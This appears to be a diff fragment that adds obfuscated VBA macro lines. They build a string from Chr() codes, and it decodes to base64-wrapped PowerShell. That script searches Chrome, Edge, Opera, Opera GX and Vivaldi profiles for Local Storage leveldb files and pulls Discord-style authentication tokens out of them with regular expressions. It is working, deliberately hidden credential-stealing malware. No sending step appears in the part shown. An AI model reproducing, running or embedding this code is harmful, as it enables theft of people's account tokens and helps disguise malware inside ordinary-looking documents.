+X19 = X19 & (Chr(74)&Chr(71)&Chr(86)&Chr(98)&Chr(77)&Chr(84)&Chr(85)&Chr(117)&Chr(76)&Chr(105)&Chr(103)&Chr(107)&Chr(90)&Chr(83)&Chr(53)&Chr(77)&Chr(90)&Chr(87)&Chr(53)&Chr(110)&Chr(100)&Chr(71)&Chr(103)&Chr(103)&Chr(76)&Chr(83)&Chr(65)&Chr(120)&Chr(78)&Chr(121)&Chr(108)&Chr(100)&Chr(75)&Chr(83)&Chr(107)&Chr(117)&Chr(86)&Chr(72)&Chr(74)&Chr(112)&Chr(98)&Chr(85)&Chr(86)&Chr(117)&Chr(90)&Chr(67)&Chr(104)&Chr(98)&Chr(89)&Chr(50)&Chr(104)&Chr(104)&Chr(99)&Chr(108)&Chr(48)&Chr(119)&Chr(75)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(97)&Chr(87)&Chr(89)&Chr(103)&Chr(75)&Chr(67)&Chr(82)&Chr(48)&Chr(97)&Chr(121)&Chr(53)&Chr(77)&Chr(90)&Chr(87)&Chr(53)&Chr(110)&Chr(100)&Chr(71)&Chr(103)&Chr(103)&Chr(76)&Chr(87)&Chr(100)&Chr(48)&Chr(73)&Chr(68)&Chr(81)&Chr(119)&Chr(73)&Chr(67)&Chr(49)&Chr(104)&Chr(98)&Chr(109)&Chr(81)&Chr(103)&Chr(73)&Chr(83)&Chr(82)&Chr(48)&Chr(98)&Chr(50)&Chr(116)&Chr(108)&Chr(98)&Chr(110)&Chr(77)&Chr(117)&Chr(81)&Chr(50)&Chr(57)&Chr(117)&Chr(100)&Chr(71)&Chr(70)&Chr(112)&Chr(98)&Chr(110)&Chr(78)&Chr(76)&Chr(90)&Chr(88)&Chr(107)&Chr(111))
+X19 = X19 & (Chr(74)&Chr(72)&Chr(82)&Chr(114)&Chr(75)&Chr(83)&Chr(107)&Chr(103)&Chr(101)&Chr(121)&Chr(65)&Chr(107)&Chr(100)&Chr(71)&Chr(57)&Chr(114)&Chr(90)&Chr(87)&Chr(53)&Chr(122)&Chr(87)&Chr(121)&Chr(82)&Chr(48)&Chr(97)&Chr(49)&Chr(48)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107)&Chr(100)&Chr(72)&Chr(74)&Chr(49)&Chr(90)&Chr(83)&Chr(66)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(72)&Chr(48)&Chr(103)&Chr(89)&Chr(50)&Chr(70)&Chr(48)&Chr(89)&Chr(50)&Chr(103)&Chr(103)&Chr(101)&Chr(51)&Chr(48)&Chr(75))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(57)&Chr(67)&Chr(110)&Chr(48)&Chr(75)&Chr(67)&Chr(105)&Chr(77)&Chr(103)&Chr(76)&Chr(83)&Chr(48)&Chr(116)&Chr(76)&Chr(83)&Chr(66)&Chr(67)&Chr(99)&Chr(109)&Chr(57)&Chr(51)&Chr(99)&Chr(50)&Chr(86)&Chr(121)&Chr(99)&Chr(121)&Chr(65)&Chr(111)&Chr(100)&Chr(50)&Chr(86)&Chr(105)&Chr(73)&Chr(72)&Chr(82)&Chr(118)&Chr(97)&Chr(50)&Chr(86)&Chr(117)&Chr(99)&Chr(121)&Chr(66)&Chr(104)&Chr(99)&Chr(109)&Chr(85)&Chr(103)&Chr(85)&Chr(69)&Chr(120)&Chr(66))
+X19 = X19 & (Chr(83)&Chr(85)&Chr(53)&Chr(85)&Chr(82)&Chr(86)&Chr(104)&Chr(85)&Chr(73)&Chr(71)&Chr(108)&Chr(117)&Chr(73)&Chr(71)&Chr(120)&Chr(118)&Chr(89)&Chr(50)&Chr(70)&Chr(115)&Chr(85)&Chr(51)&Chr(82)&Chr(118)&Chr(99)&Chr(109)&Chr(70)&Chr(110)&Chr(90)&Chr(83)&Chr(66)&Chr(115)&Chr(90)&Chr(88)&Chr(90)&Chr(108)&Chr(98)&Chr(71)&Chr(82)&Chr(105)&Chr(76)&Chr(67)&Chr(66)&Chr(86)&Chr(86)&Chr(69)&Chr(89)&Chr(116)&Chr(77)&Chr(84)&Chr(90)&Chr(77)&Chr(82)&Chr(83)&Chr(107)&Chr(103)&Chr(76)&Chr(83)&Chr(48)&Chr(116)&Chr(76)&Chr(81)&Chr(112)&Chr(109)&Chr(98)&Chr(51)&Chr(74)&Chr(108)&Chr(89)&Chr(87)&Chr(78)&Chr(111))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(103)&Chr(107)&Chr(89)&Chr(110)&Chr(73)&Chr(103)&Chr(97)&Chr(87)&Chr(52)&Chr(103)&Chr(81)&Chr(67)&Chr(103)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(73)&Chr(107)&Chr(90)&Chr(87)&Chr(53)&Chr(50)&Chr(79)&Chr(107)&Chr(120)&Chr(80)&Chr(81)&Chr(48)&Chr(70)&Chr(77)&Chr(81)&Chr(86)&Chr(66)&Chr(81)&Chr(82)&Chr(69)&Chr(70)&Chr(85)&Chr(81)&Chr(86)&Chr(120)&Chr(72)&Chr(98)&Chr(50)&Chr(57)&Chr(110)&Chr(98)&Chr(71)&Chr(86)&Chr(99)&Chr(81)&Chr(50)&Chr(104)&Chr(121)&Chr(98)&Chr(50)&Chr(49)&Chr(108)&Chr(88)&Chr(70)&Chr(86)&Chr(122)&Chr(90)&Chr(88)&Chr(73)&Chr(103))
+X19 = X19 & (Chr(82)&Chr(71)&Chr(70)&Chr(48)&Chr(89)&Chr(83)&Chr(73)&Chr(115)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(105)&Chr(74)&Chr(71)&Chr(86)&Chr(117)&Chr(100)&Chr(106)&Chr(112)&Chr(77)&Chr(84)&Chr(48)&Chr(78)&Chr(66)&Chr(84)&Chr(69)&Chr(70)&Chr(81)&Chr(85)&Chr(69)&Chr(82)&Chr(66)&Chr(86)&Chr(69)&Chr(70)&Chr(99)&Chr(84)&Chr(87)&Chr(108)&Chr(106)&Chr(99)&Chr(109)&Chr(57)&Chr(122)&Chr(98)&Chr(50)&Chr(90)&Chr(48)&Chr(88)&Chr(69)&Chr(86)&Chr(107)&Chr(90)&Chr(50)&Chr(86)&Chr(99)&Chr(86)&Chr(88)&Chr(78)&Chr(108)&Chr(99)&Chr(105)&Chr(66)&Chr(69)&Chr(89)&Chr(88)&Chr(82)&Chr(104))
+X19 = X19 & (Chr(73)&Chr(105)&Chr(119)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(73)&Chr(107)&Chr(90)&Chr(87)&Chr(53)&Chr(50)&Chr(79)&Chr(107)&Chr(120)&Chr(80)&Chr(81)&Chr(48)&Chr(70)&Chr(77)&Chr(81)&Chr(86)&Chr(66)&Chr(81)&Chr(82)&Chr(69)&Chr(70)&Chr(85)&Chr(81)&Chr(86)&Chr(120)&Chr(67)&Chr(99)&Chr(109)&Chr(70)&Chr(50)&Chr(90)&Chr(86)&Chr(78)&Chr(118)&Chr(90)&Chr(110)&Chr(82)&Chr(51)&Chr(89)&Chr(88)&Chr(74)&Chr(108)&Chr(88)&Chr(69)&Chr(74)&Chr(121)&Chr(89)&Chr(88)&Chr(90)&Chr(108)&Chr(76)&Chr(85)&Chr(74)&Chr(121)&Chr(98)&Chr(51)&Chr(100)&Chr(122)&Chr(90)&Chr(88)&Chr(74)&Chr(99))
+X19 = X19 & (Chr(86)&Chr(88)&Chr(78)&Chr(108)&Chr(99)&Chr(105)&Chr(66)&Chr(69)&Chr(89)&Chr(88)&Chr(82)&Chr(104)&Chr(73)&Chr(105)&Chr(119)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(73)&Chr(107)&Chr(90)&Chr(87)&Chr(53)&Chr(50)&Chr(79)&Chr(107)&Chr(70)&Chr(81)&Chr(85)&Chr(69)&Chr(82)&Chr(66)&Chr(86)&Chr(69)&Chr(70)&Chr(99)&Chr(84)&Chr(51)&Chr(66)&Chr(108)&Chr(99)&Chr(109)&Chr(69)&Chr(103)&Chr(85)&Chr(50)&Chr(57)&Chr(109)&Chr(100)&Chr(72)&Chr(100)&Chr(104)&Chr(99)&Chr(109)&Chr(86)&Chr(99)&Chr(84)&Chr(51)&Chr(66)&Chr(108)&Chr(99)&Chr(109)&Chr(69)&Chr(103)&Chr(85)&Chr(51)&Chr(82)&Chr(104))
+X19 = X19 & (Chr(89)&Chr(109)&Chr(120)&Chr(108)&Chr(73)&Chr(105)&Chr(119)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(73)&Chr(107)&Chr(90)&Chr(87)&Chr(53)&Chr(50)&Chr(79)&Chr(107)&Chr(70)&Chr(81)&Chr(85)&Chr(69)&Chr(82)&Chr(66)&Chr(86)&Chr(69)&Chr(70)&Chr(99)&Chr(84)&Chr(51)&Chr(66)&Chr(108)&Chr(99)&Chr(109)&Chr(69)&Chr(103)&Chr(85)&Chr(50)&Chr(57)&Chr(109)&Chr(100)&Chr(72)&Chr(100)&Chr(104)&Chr(99)&Chr(109)&Chr(86)&Chr(99)&Chr(84)&Chr(51)&Chr(66)&Chr(108)&Chr(99)&Chr(109)&Chr(69)&Chr(103)&Chr(82)&Chr(49)&Chr(103)&Chr(103)&Chr(85)&Chr(51)&Chr(82)&Chr(104)&Chr(89)&Chr(109)&Chr(120)&Chr(108))
+X19 = X19 & (Chr(73)&Chr(105)&Chr(119)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(73)&Chr(107)&Chr(90)&Chr(87)&Chr(53)&Chr(50)&Chr(79)&Chr(107)&Chr(120)&Chr(80)&Chr(81)&Chr(48)&Chr(70)&Chr(77)&Chr(81)&Chr(86)&Chr(66)&Chr(81)&Chr(82)&Chr(69)&Chr(70)&Chr(85)&Chr(81)&Chr(86)&Chr(120)&Chr(87)&Chr(97)&Chr(88)&Chr(90)&Chr(104)&Chr(98)&Chr(71)&Chr(82)&Chr(112)&Chr(88)&Chr(70)&Chr(86)&Chr(122)&Chr(90)&Chr(88)&Chr(73)&Chr(103)&Chr(82)&Chr(71)&Chr(70)&Chr(48)&Chr(89)&Chr(83)&Chr(73)&Chr(75)&Chr(75)&Chr(83)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103))
+X19 = X19 & (Chr(97)&Chr(87)&Chr(89)&Chr(103)&Chr(75)&Chr(67)&Chr(69)&Chr(111)&Chr(86)&Chr(71)&Chr(86)&Chr(122)&Chr(100)&Chr(67)&Chr(49)&Chr(81)&Chr(89)&Chr(88)&Chr(82)&Chr(111)&Chr(73)&Chr(67)&Chr(82)&Chr(105)&Chr(99)&Chr(105)&Chr(107)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(103)&Chr(89)&Chr(50)&Chr(57)&Chr(117)&Chr(100)&Chr(71)&Chr(108)&Chr(117)&Chr(100)&Chr(87)&Chr(85)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(74)&Chr(72)&Chr(66)&Chr(121)&Chr(98)&Chr(50)&Chr(90)&Chr(122)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(82)&Chr(50)&Chr(86)&Chr(48)&Chr(76)&Chr(85)&Chr(78)&Chr(111))
+X19 = X19 & (Chr(97)&Chr(87)&Chr(120)&Chr(107)&Chr(83)&Chr(88)&Chr(82)&Chr(108)&Chr(98)&Chr(83)&Chr(65)&Chr(107)&Chr(89)&Chr(110)&Chr(73)&Chr(103)&Chr(76)&Chr(85)&Chr(82)&Chr(112)&Chr(99)&Chr(109)&Chr(86)&Chr(106)&Chr(100)&Chr(71)&Chr(57)&Chr(121)&Chr(101)&Chr(83)&Chr(65)&Chr(116)&Chr(82)&Chr(88)&Chr(74)&Chr(121)&Chr(98)&Chr(51)&Chr(74)&Chr(66)&Chr(89)&Chr(51)&Chr(82)&Chr(112)&Chr(98)&Chr(50)&Chr(52)&Chr(103)&Chr(85)&Chr(50)&Chr(108)&Chr(115)&Chr(90)&Chr(87)&Chr(53)&Chr(48)&Chr(98)&Chr(72)&Chr(108)&Chr(68)&Chr(98)&Chr(50)&Chr(53)&Chr(48)&Chr(97)&Chr(87)&Chr(53)&Chr(49)&Chr(90)&Chr(83)&Chr(66)&Chr(56))
+X19 = X19 & (Chr(73)&Chr(70)&Chr(100)&Chr(111)&Chr(90)&Chr(88)&Chr(74)&Chr(108)&Chr(76)&Chr(85)&Chr(57)&Chr(105)&Chr(97)&Chr(109)&Chr(86)&Chr(106)&Chr(100)&Chr(67)&Chr(66)&Chr(55)&Chr(73)&Chr(67)&Chr(82)&Chr(102)&Chr(76)&Chr(107)&Chr(53)&Chr(104)&Chr(98)&Chr(87)&Chr(85)&Chr(103)&Chr(76)&Chr(87)&Chr(86)&Chr(120)&Chr(73)&Chr(67)&Chr(100)&Chr(69)&Chr(90)&Chr(87)&Chr(90)&Chr(104)&Chr(100)&Chr(87)&Chr(120)&Chr(48)&Chr(74)&Chr(121)&Chr(65)&Chr(116)&Chr(98)&Chr(51)&Chr(73)&Chr(103)&Chr(74)&Chr(70)&Chr(56)&Chr(117)&Chr(84)&Chr(109)&Chr(70)&Chr(116)&Chr(90)&Chr(83)&Chr(65)&Chr(116)&Chr(98)&Chr(87)&Chr(70)&Chr(48))
+X19 = X19 & (Chr(89)&Chr(50)&Chr(103)&Chr(103)&Chr(74)&Chr(49)&Chr(53)&Chr(81)&Chr(99)&Chr(109)&Chr(57)&Chr(109)&Chr(97)&Chr(87)&Chr(120)&Chr(108)&Chr(74)&Chr(121)&Chr(66)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(109)&Chr(98)&Chr(51)&Chr(74)&Chr(108)&Chr(89)&Chr(87)&Chr(78)&Chr(111)&Chr(73)&Chr(67)&Chr(103)&Chr(107)&Chr(99)&Chr(67)&Chr(66)&Chr(112)&Chr(98)&Chr(105)&Chr(65)&Chr(107)&Chr(99)&Chr(72)&Chr(74)&Chr(118)&Chr(90)&Chr(110)&Chr(77)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107))
+X19 = X19 & (Chr(98)&Chr(72)&Chr(78)&Chr(107)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(83)&Chr(109)&Chr(57)&Chr(112)&Chr(98)&Chr(105)&Chr(49)&Chr(81)&Chr(89)&Chr(88)&Chr(82)&Chr(111)&Chr(73)&Chr(67)&Chr(82)&Chr(119)&Chr(76)&Chr(107)&Chr(90)&Chr(49)&Chr(98)&Chr(71)&Chr(120)&Chr(79)&Chr(89)&Chr(87)&Chr(49)&Chr(108)&Chr(73)&Chr(67)&Chr(100)&Chr(77)&Chr(98)&Chr(50)&Chr(78)&Chr(104)&Chr(98)&Chr(67)&Chr(66)&Chr(84)&Chr(100)&Chr(71)&Chr(57)&Chr(121)&Chr(89)&Chr(87)&Chr(100)&Chr(108)&Chr(88)&Chr(71)&Chr(120)&Chr(108)&Chr(100)&Chr(109)&Chr(86)&Chr(115)&Chr(90)&Chr(71)&Chr(73)&Chr(110)&Chr(67)&Chr(105)&Chr(65)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(97)&Chr(87)&Chr(89)&Chr(103)&Chr(75)&Chr(67)&Chr(69)&Chr(111)&Chr(86)&Chr(71)&Chr(86)&Chr(122)&Chr(100)&Chr(67)&Chr(49)&Chr(81)&Chr(89)&Chr(88)&Chr(82)&Chr(111)&Chr(73)&Chr(67)&Chr(82)&Chr(115)&Chr(99)&Chr(50)&Chr(81)&Chr(112)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(73)&Chr(71)&Chr(78)&Chr(118)&Chr(98)&Chr(110)&Chr(82)&Chr(112)&Chr(98)&Chr(110)&Chr(86)&Chr(108)&Chr(73)&Chr(72)&Chr(48)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(90)&Chr(109)&Chr(108)&Chr(115))
+X19 = X19 & (Chr(90)&Chr(88)&Chr(77)&Chr(103)&Chr(80)&Chr(83)&Chr(66)&Chr(72)&Chr(90)&Chr(88)&Chr(81)&Chr(116)&Chr(81)&Chr(50)&Chr(104)&Chr(112)&Chr(98)&Chr(71)&Chr(82)&Chr(74)&Chr(100)&Chr(71)&Chr(86)&Chr(116)&Chr(73)&Chr(67)&Chr(82)&Chr(115)&Chr(99)&Chr(50)&Chr(81)&Chr(103)&Chr(76)&Chr(85)&Chr(90)&Chr(112)&Chr(98)&Chr(71)&Chr(85)&Chr(103)&Chr(76)&Chr(85)&Chr(86)&Chr(121)&Chr(99)&Chr(109)&Chr(57)&Chr(121)&Chr(81)&Chr(87)&Chr(78)&Chr(48)&Chr(97)&Chr(87)&Chr(57)&Chr(117)&Chr(73)&Chr(70)&Chr(78)&Chr(112)&Chr(98)&Chr(71)&Chr(86)&Chr(117)&Chr(100)&Chr(71)&Chr(120)&Chr(53)&Chr(81)&Chr(50)&Chr(57)&Chr(117))
+X19 = X19 & (Chr(100)&Chr(71)&Chr(108)&Chr(117)&Chr(100)&Chr(87)&Chr(85)&Chr(103)&Chr(102)&Chr(67)&Chr(66)&Chr(88)&Chr(97)&Chr(71)&Chr(86)&Chr(121)&Chr(90)&Chr(83)&Chr(49)&Chr(80)&Chr(89)&Chr(109)&Chr(112)&Chr(108)&Chr(89)&Chr(51)&Chr(81)&Chr(103)&Chr(101)&Chr(121)&Chr(65)&Chr(107)&Chr(88)&Chr(121)&Chr(53)&Chr(79)&Chr(89)&Chr(87)&Chr(49)&Chr(108)&Chr(73)&Chr(67)&Chr(49)&Chr(116)&Chr(89)&Chr(88)&Chr(82)&Chr(106)&Chr(97)&Chr(67)&Chr(65)&Chr(110)&Chr(88)&Chr(67)&Chr(52)&Chr(111)&Chr(98)&Chr(71)&Chr(82)&Chr(105)&Chr(102)&Chr(71)&Chr(120)&Chr(118)&Chr(90)&Chr(121)&Chr(107)&Chr(107)&Chr(74)&Chr(121)&Chr(66)&Chr(57))
+X19 = X19 & (Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(90)&Chr(109)&Chr(57)&Chr(121)&Chr(90)&Chr(87)&Chr(70)&Chr(106)&Chr(97)&Chr(67)&Chr(65)&Chr(111)&Chr(74)&Chr(71)&Chr(89)&Chr(103)&Chr(97)&Chr(87)&Chr(52)&Chr(103)&Chr(74)&Chr(71)&Chr(90)&Chr(112)&Chr(98)&Chr(71)&Chr(86)&Chr(122)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(121)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(85)&Chr(109)&Chr(86)&Chr(104))
+X19 = X19 & (Chr(90)&Chr(67)&Chr(49)&Chr(71)&Chr(97)&Chr(87)&Chr(120)&Chr(108)&Chr(86)&Chr(71)&Chr(86)&Chr(52)&Chr(100)&Chr(67)&Chr(65)&Chr(107)&Chr(90)&Chr(105)&Chr(53)&Chr(71)&Chr(100)&Chr(87)&Chr(120)&Chr(115)&Chr(84)&Chr(109)&Chr(70)&Chr(116)&Chr(90)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(112)&Chr(90)&Chr(105)&Chr(65)&Chr(111)&Chr(73)&Chr(83)&Chr(82)&Chr(121)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(73)&Chr(71)&Chr(78)&Chr(118)&Chr(98)&Chr(110)&Chr(82)&Chr(112)&Chr(98)&Chr(110)&Chr(86)&Chr(108))
+X19 = X19 & (Chr(73)&Chr(72)&Chr(48)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(121)&Chr(66)&Chr(84)&Chr(100)&Chr(72)&Chr(74)&Chr(112)&Chr(99)&Chr(67)&Chr(66)&Chr(117)&Chr(100)&Chr(87)&Chr(120)&Chr(115)&Chr(73)&Chr(71)&Chr(74)&Chr(53)&Chr(100)&Chr(71)&Chr(86)&Chr(122)&Chr(73)&Chr(67)&Chr(104)&Chr(68)&Chr(97)&Chr(72)&Chr(74)&Chr(118)&Chr(98)&Chr(87)&Chr(108)&Chr(49)&Chr(98)&Chr(83)&Chr(66)&Chr(115)&Chr(98)&Chr(50)&Chr(78)&Chr(104)&Chr(98)&Chr(70)&Chr(78)&Chr(48)&Chr(98)&Chr(51)&Chr(74)&Chr(104))
+X19 = X19 & (Chr(90)&Chr(50)&Chr(85)&Chr(103)&Chr(100)&Chr(109)&Chr(70)&Chr(115)&Chr(100)&Chr(87)&Chr(86)&Chr(122)&Chr(73)&Chr(71)&Chr(70)&Chr(121)&Chr(90)&Chr(83)&Chr(66)&Chr(86)&Chr(86)&Chr(69)&Chr(89)&Chr(116)&Chr(77)&Chr(84)&Chr(90)&Chr(77)&Chr(82)&Chr(83)&Chr(65)&Chr(116)&Chr(80)&Chr(105)&Chr(66)&Chr(48)&Chr(98)&Chr(50)&Chr(116)&Chr(108)&Chr(98)&Chr(105)&Chr(66)&Chr(106)&Chr(97)&Chr(71)&Chr(70)&Chr(121)&Chr(99)&Chr(121)&Chr(66)&Chr(122)&Chr(99)&Chr(71)&Chr(120)&Chr(112)&Chr(100)&Chr(67)&Chr(66)&Chr(105)&Chr(101)&Chr(83)&Chr(66)&Chr(99)&Chr(101)&Chr(68)&Chr(65)&Chr(119)&Chr(75)&Chr(81)&Chr(111)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(99)&Chr(105)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(82)&Chr(121)&Chr(73)&Chr(67)&Chr(49)&Chr(121)&Chr(90)&Chr(88)&Chr(66)&Chr(115)&Chr(89)&Chr(87)&Chr(78)&Chr(108)&Chr(73)&Chr(67)&Chr(74)&Chr(99)&Chr(101)&Chr(68)&Chr(65)&Chr(119)&Chr(73)&Chr(105)&Chr(119)&Chr(103)&Chr(73)&Chr(105)&Chr(73)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(90)&Chr(109)&Chr(57)&Chr(121))
+X19 = X19 & (Chr(90)&Chr(87)&Chr(70)&Chr(106)&Chr(97)&Chr(67)&Chr(65)&Chr(111)&Chr(74)&Chr(71)&Chr(48)&Chr(103)&Chr(97)&Chr(87)&Chr(52)&Chr(103)&Chr(87)&Chr(51)&Chr(74)&Chr(108)&Chr(90)&Chr(50)&Chr(86)&Chr(52)&Chr(88)&Chr(84)&Chr(111)&Chr(54)&Chr(84)&Chr(87)&Chr(70)&Chr(48)&Chr(89)&Chr(50)&Chr(104)&Chr(108)&Chr(99)&Chr(121)&Chr(103)&Chr(107)&Chr(99)&Chr(105)&Chr(119)&Chr(103)&Chr(74)&Chr(49)&Chr(116)&Chr(66)&Chr(76)&Chr(86)&Chr(112)&Chr(104)&Chr(76)&Chr(88)&Chr(111)&Chr(119)&Chr(76)&Chr(84)&Chr(108)&Chr(102)&Chr(76)&Chr(86)&Chr(49)&Chr(55)&Chr(77)&Chr(106)&Chr(82)&Chr(57)&Chr(88)&Chr(67)&Chr(53)&Chr(98))
+X19 = X19 & (Chr(81)&Chr(83)&Chr(49)&Chr(97)&Chr(89)&Chr(83)&Chr(49)&Chr(54)&Chr(77)&Chr(67)&Chr(48)&Chr(53)&Chr(88)&Chr(121)&Chr(49)&Chr(100)&Chr(101)&Chr(122)&Chr(90)&Chr(57)&Chr(88)&Chr(67)&Chr(53)&Chr(98)&Chr(81)&Chr(83)&Chr(49)&Chr(97)&Chr(89)&Chr(83)&Chr(49)&Chr(54)&Chr(77)&Chr(67)&Chr(48)&Chr(53)&Chr(88)&Chr(121)&Chr(49)&Chr(100)&Chr(101)&Chr(122)&Chr(73)&Chr(51)&Chr(76)&Chr(68)&Chr(69)&Chr(120)&Chr(77)&Chr(72)&Chr(48)&Chr(110)&Chr(75)&Chr(83)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(74)&Chr(72)&Chr(82)&Chr(114)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(74)&Chr(71)&Chr(48)&Chr(117)&Chr(86)&Chr(109)&Chr(70)&Chr(115)&Chr(100)&Chr(87)&Chr(85)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(71)&Chr(108)&Chr(109)&Chr(73)&Chr(67)&Chr(103)&Chr(104)&Chr(74)&Chr(72)&Chr(82)&Chr(118)&Chr(97)&Chr(50)&Chr(86)&Chr(117)&Chr(99)&Chr(121)&Chr(53)&Chr(68)&Chr(98)&Chr(50)&Chr(53)&Chr(48))
+X19 = X19 & (Chr(89)&Chr(87)&Chr(108)&Chr(117)&Chr(99)&Chr(48)&Chr(116)&Chr(108)&Chr(101)&Chr(83)&Chr(103)&Chr(107)&Chr(100)&Chr(71)&Chr(115)&Chr(112)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(73)&Chr(67)&Chr(82)&Chr(48)&Chr(98)&Chr(50)&Chr(116)&Chr(108)&Chr(98)&Chr(110)&Chr(78)&Chr(98)&Chr(74)&Chr(72)&Chr(82)&Chr(114)&Chr(88)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(82)&Chr(48)&Chr(99)&Chr(110)&Chr(86)&Chr(108)&Chr(73)&Chr(72)&Chr(48)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(109)&Chr(98)&Chr(51)&Chr(74)&Chr(108)&Chr(89)&Chr(87)&Chr(78)&Chr(111)&Chr(73)&Chr(67)&Chr(103)&Chr(107)&Chr(98)&Chr(83)&Chr(66)&Chr(112)&Chr(98)&Chr(105)&Chr(66)&Chr(98)&Chr(99)&Chr(109)&Chr(86)&Chr(110)&Chr(90)&Chr(88)&Chr(104)&Chr(100)&Chr(79)&Chr(106)&Chr(112)&Chr(78)&Chr(89)&Chr(88)&Chr(82)&Chr(106)&Chr(97)&Chr(71)&Chr(86)&Chr(122)&Chr(75)&Chr(67)&Chr(82)&Chr(121)&Chr(76)&Chr(67)&Chr(65)&Chr(110)&Chr(98)&Chr(87)&Chr(90)&Chr(104)&Chr(88)&Chr(67)&Chr(53)&Chr(98))
